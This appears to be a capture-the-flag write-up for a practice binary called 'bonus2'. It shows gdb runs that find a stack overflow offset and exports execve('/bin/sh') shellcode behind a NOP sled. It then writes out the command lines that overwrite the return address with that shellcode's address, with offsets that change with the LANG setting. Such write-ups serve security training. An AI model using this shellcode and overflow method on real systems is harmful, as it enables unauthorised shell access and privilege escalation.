(gdb) run aaAAbbBBccCCddDDeeEEffFFggGGhhHHiiIIjjJJkkKKllLLmmMMnnNNooOOppPPqqQQrrRRssSSttTTuuUUvvVVwwWWxxXXyyYYzzZZ aaAAbbBBccCCddDDeeEEffFFggGGhhHHiiIIjjJJkkKKllLLmmMMnnNNooOOppPPqqQQrrRRssSSttTTuuUUvvVVwwWWxxXXyyYYzzZZ
Starting program: /home/user/bonus2/bonus2 aaAAbbBBccCCddDDeeEEffFFggGGhhHHiiIIjjJJkkKKllLLmmMMnnNNooOOppPPqqQQrrRRssSSttTTuuUUvvVVwwWWxxXXyyYYzzZZ aaAAbbBBccCCddDDeeEEffFFggGGhhHHiiIIjjJJkkKKllLLmmMMnnNNooOOppPPqqQQrrRRssSSttTTuuUUvvVVwwWWxxXXyyYYzzZZ
Hello aaAAbbBBccCCddDDeeEEffFFggGGhhHHiiIIjjJJaaAAbbBBccCCddDDeeEEffFFggGGhhHH

Program received signal SIGSEGV, Segmentation fault.
0x08004848 in ?? ()
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
(gdb)

0x08004848 -> "\0HH"
0x08004242 -> "\0BB" 

since it's little endian it's (falling) in reverse.

Soooooooooooooooooooooooooooo, tl;dr argv2 segfault at 26 (- 4 = 22).

we'll use the same shell code as last time.

```
export SHELLCODE=$(python -c 'print("\x90" * 64 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")')
``` 

`./bonus2 $(python -c "print('\x90' * 40)") $(python -c "print('\x90' * 34 + '\xbf\xff\xf8\xc3'[::-1] + '\x90' * 50)")`

and it still segfault... By looking a bit to the code `getenv` is called with `LANG`. It can be either `en` (by default) `nl` `fi`.

`export LANG="nl"`

With LANG=nl, the binary segfault at 18, with LANG=fi it's at 23

`./bonus2 $(python -c "print('\x90' * 40)") $(python -c "print('\x90' * 18 + '\xbf\xff\xf8\xc3'[::-1] + '\x90' * 50)")`